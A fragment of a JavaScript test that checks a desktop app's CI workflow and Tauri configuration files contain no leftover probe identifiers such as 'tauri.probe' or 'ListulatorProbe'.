    for (const file of ['.github/workflows/release.yml', '.github/workflows/updater-test-windows.yml', 'apps/desktop/src-tauri/tauri.updater-artifacts.conf.json', 'apps/desktop/src-tauri/tauri.conf.json', 'apps/desktop/src-tauri/tauri.updater-test.conf.json']) {
      expect(read(file), file).not.toMatch(/tauri\.probe|ListulatorProbe|desktop\.probe/)
    }
  })
})
